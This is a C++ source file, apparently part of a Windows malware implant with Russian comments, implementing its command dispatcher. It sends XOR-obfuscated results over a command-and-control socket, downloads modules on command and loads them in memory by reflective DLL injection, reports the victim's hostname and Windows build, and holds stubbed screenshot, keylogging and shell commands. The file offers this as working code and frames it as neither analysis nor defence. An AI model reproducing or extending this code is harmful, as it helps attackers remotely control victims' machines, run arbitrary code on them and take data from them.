// Core/commands.cpp — FIXED ORDERING & ROBUST SEND
#include "commands.h"
#include "loader.h"
#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>

// Глобальный сокет (объявлен в network.cpp)
extern SOCKET g_c2_socket;

// ==========================================
// 1. CALLBACKS (ОПРЕДЕЛЕНЫ ДО ИСПОЛЬЗОВАНИЯ)
// ==========================================
static void module_log(const char* msg) {
    OutputDebugStringA("[MODULE] ");
    OutputDebugStringA(msg);
    OutputDebugStringA("\n");
}

static void module_send_result(const uint8_t* data, size_t len) {
    if (g_c2_socket == INVALID_SOCKET) return;
    
    // Проверяем, есть ли уже \n в конце
    bool has_newline = (len > 0 && data[len-1] == '\n');
    size_t total_len = has_newline ? len : len + 1;
    
    uint8_t* encrypted = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, total_len);
    if (!encrypted) return;
    
    for (size_t i = 0; i < len; i++) {
        encrypted[i] = data[i] ^ 0xAA;
    }
    if (!has_newline) {
        encrypted[len] = '\n';
    }
    
    const size_t CHUNK_SIZE = 65536;
    size_t sent = 0;
    while (sent < total_len) {
        size_t to_send = (total_len - sent > CHUNK_SIZE) ? CHUNK_SIZE : (total_len - sent);
        int res = send(g_c2_socket, (const char*)(encrypted + sent), (int)to_send, 0);
        if (res <= 0) break;
        sent += res;
    }
    
    HeapFree(GetProcessHeap(), 0, encrypted);
}
// ==========================================


// Структура для RtlGetVersion
typedef struct _MY_OSVERSIONINFOW {
    ULONG dwOSVersionInfoSize; ULONG dwMajorVersion; ULONG dwMinorVersion; ULONG dwBuildNumber; ULONG dwPlatformId; WCHAR szCSDVersion[128];
} MY_OSVERSIONINFOW;
typedef NTSTATUS (NTAPI* pRtlGetVersion)(MY_OSVERSIONINFOW*);

// ==========================================
// 2. COMMAND DISPATCHER
// ==========================================
std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
    if (cmd == "ping") return "pong";
    
    else if (cmd.rfind("LOAD_MODULE ", 0) == 0) {
        std::string module_name = cmd.substr(12);
        
        std::vector<uint8_t> dll_data;
        if (!download_module(module_name, dll_data))
            return "MODULE_DOWNLOAD_FAILED";
        
        xor_decrypt(dll_data);
        
        void* modbase = nullptr;
        if (!load_reflective_dll(dll_data, modbase))
            return "MODULE_LOAD_FAILED";
        
        // ТЕПЕРЬ КОМПИЛЯТОР ВИДИТ module_send_result и module_log
        ModuleAPI api = { module_send_result, module_log, nullptr };
        if (!execute_module(modbase, api))
            return "MODULE_EXECUTION_FAILED";
        
        return "MODULE_LOADED_OK";
    }
    
    else if (cmd == "info") {
        char host[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD s = sizeof(host);
        if (!GetComputerNameA(host, &s)) strcpy_s(host, "Unknown");
        
        ULONG major = 0, minor = 0, build = 0; 
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            pRtlGetVersion pRtlGetVer = (pRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
            if (pRtlGetVer) {
                MY_OSVERSIONINFOW rovi = {0};
                rovi.dwOSVersionInfoSize = sizeof(rovi);
                if (pRtlGetVer(&rovi) == 0) {
                    major = rovi.dwMajorVersion;
                    minor = rovi.dwMinorVersion;
                    build = rovi.dwBuildNumber;
                }
            }
        }
        
        std::string os_name = "Windows";
        if (major == 10 && build >= 22000) os_name = "Windows 11";
        else if (major == 10) os_name = "Windows 10";
        else if (major == 6) os_name = "Windows 7/8";

        char buf[256];
        sprintf_s(buf, "hostname=%s; os=%s Build %d", host, os_name.c_str(), build);
        return std::string(buf);
    } 
    
    else if (cmd == "uninstall") {
        return "UNINSTALLING";
    }
    
    else if (cmd.find("screenshot") != std::string::npos) return "SCREENSHOT_DISABLED";
    else if (cmd.find("keylog") != std::string::npos) return "KEYLOG_DISABLED";
    else if (cmd.find("shell") != std::string::npos) return "SHELL_DISABLED";
    
    return "UNKNOWN_COMMAND";
}